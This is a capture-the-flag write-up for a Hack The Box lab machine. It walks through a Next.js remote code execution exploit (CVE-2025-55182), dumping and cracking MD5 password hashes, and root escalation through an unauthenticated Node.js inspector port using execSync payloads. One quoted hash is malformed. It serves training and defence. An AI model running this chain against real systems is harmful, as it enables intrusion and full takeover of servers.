# Machine: Reactor

Date: 23-05-2026
Platform: HTB
Difficulty: Easy
Author: WhoKn0ws

---

## Recon

### Nmap:

```bash
nmap -p- --min-rate 5000 -sV -sC $MACHINE_IP
```

**Results:**

- Port 22 → SSH (OpenSSH 9.6p1, Ubuntu)
- Port 3000 → HTTP (Next.js app — "ReactorWatch" v3.2.1)

**Full port scan:**

Full port scan was run directly (`-p-`), no additional ports found beyond 22 and 3000.

**Notes:**

- Port 3000 fingerprinted via nmap's service probes as a Next.js application (X-Powered-By: Next.js, Next-Router headers present in responses)
- No hostname/vhost needed — accessed directly via IP

---

## Enumeration

### Application fingerprinting:

- `http://$MACHINE_IP:3000/` → "ReactorWatch" v3.2.1 — a Next.js-based nuclear reactor monitoring dashboard ("Nuclear Dynamics Corp. - Site 7")
- Version banner (v3.2.1) matched a known public CVE for React/Next.js

### Vulnerability identification:

- ReactorWatch v3.2.1 is vulnerable to **CVE-2025-55182** (React/Next.js), with a public exploit available: https://github.com/Chocapikk/CVE-2025-55182

---

## Exploitation

### CVE-2025-55182 — Next.js RCE

ReactorWatch v3.2.1 is affected by CVE-2025-55182, a remote code execution vulnerability in React/Next.js. A public exploit script handles the request crafting needed to achieve command execution on the server.

**Steps:**

**1. Confirm RCE:**

```bash
python3 exploit.py -u http://$MACHINE_IP:3000/ -c "id"
```

**Result:** `uid=999(node) gid=988(node) groups=988(node)` — confirmed command execution as the `node` service user.

**2. Enumerate the web root:**

```bash
python3 exploit.py -u http://$MACHINE_IP:3000/ -c "ls"
```

**Result:** Found `reactor.db` alongside the app files — a SQLite database.

**3. Dump the database:**

```bash
python3 exploit.py -u http://$MACHINE_IP:3000/ -c "cat reactor.db"
```

**Result:** Raw SQLite dump revealed a `users` table with two accounts:

- `engineer` — MD5 hash `39d97110eafe2a9a68639812cd271e8` — role: operator
- `admin` — MD5 hash `a203b22191d744a4e70ada5c101b17b8` — role: administrator

Also present: a `sensor_logs` table (reactor telemetry data, not relevant to the attack path).

### Crack the credentials:

```bash
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:** `engineer` hash cracked → password `reactor1`

### Authenticate over SSH:

```bash
ssh engineer@$MACHINE_IP
```

**Result:** Logged in as `engineer` ✓ — `user.txt` read successfully.

---

## Privilege Escalation

### Enumeration:

```bash
ss -antp
```

**Findings:**

- `127.0.0.1:9229` listening locally — the default port for the Node.js V8 Inspector (remote debugging) protocol
- The main ReactorWatch app was still running on port 3000 as a background service

### Node.js Inspector unauthenticated RCE:

The Node.js process bound its inspector/debug port (9229) to localhost with no authentication. The inspector protocol has no built-in auth — anyone who can reach the port (including any local user) can attach and execute arbitrary JavaScript in the context of the debugged process. Since the process was running as root, this gives full code execution as root.

```bash
node inspect localhost:9229
```

At the `debug>` prompt:

```javascript
exec("process.mainModule.require('child_process').execSync('whoami').toString()")
```

**Result:** `'root\n'` — confirmed code execution as root.

```javascript
exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
```

**Successful escalation:** root ✓

---

## Loot / Flags

- **user.txt:** `[FLAG REDACTED]` → `/home/engineer/user.txt`
- **root.txt:** `[FLAG REDACTED]` → `/root/root.txt` (read via Node.js Inspector RCE as root)

---

## Lessons Learned

- Always check web app version banners against public CVE databases early — ReactorWatch's version string directly pointed to CVE-2025-55182 with a ready-made public exploit
- SQLite database files leaked via RCE are worth dumping raw (`cat`) even without a SQL client available locally — the schema and data are readable directly from the binary format
- MD5 password hashes crack fast against rockyou.txt — always attempt this before looking for more complex privesc paths
- `ss -antp` after landing a shell is essential for spotting internally-bound services not visible from an external scan — port 9229 (Node Inspector) was only visible locally
- The Node.js Inspector protocol (`--inspect`, port 9229) has no built-in authentication by design — if a root-owned Node process exposes it, even to localhost only, any local user can escalate to root via `node inspect` and `exec()`
- General takeaway: debug/inspector ports left open on production or CTF services are a recurring privesc vector — always check `ss`/`netstat` for unfamiliar local ports after initial foothold
